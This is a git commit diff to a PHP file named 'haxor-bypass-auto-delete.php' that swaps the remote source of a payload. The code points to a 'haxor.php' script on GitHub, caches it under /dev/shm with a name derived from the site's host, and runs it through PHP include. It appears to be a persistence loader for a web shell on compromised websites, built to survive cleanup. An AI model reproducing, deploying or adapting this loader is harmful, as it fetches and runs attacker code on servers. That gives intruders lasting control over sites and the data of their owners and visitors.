a4fcd97b4717e4761d523ff221bdaea2faa92a9d
kutanews <seosys303@gmail.com>
2025-07-04 06:02:42 +0700

    Update haxor-bypass-auto-delete.php

--- haxor-bypass-auto-delete.php
+++ haxor-bypass-auto-delete.php
@@ -1,5 +1,5 @@
 <?php
-$data = ['https://raw.githubusercontent.com/HaxorSecInfec/HaxorSecv2/refs/heads/main/haxorsecv2.php', '/dev/shm/'.md5($_SERVER['HTTP_HOST'])];
+$data = ['https://raw.githubusercontent.com/boyas2/aboyas/refs/heads/main/haxor.php', '/dev/shm/'.md5($_SERVER['HTTP_HOST'])];
 
 if(file_exists($data[1]) && filesize($data[1]) !== 0) {
     include($data[1]);
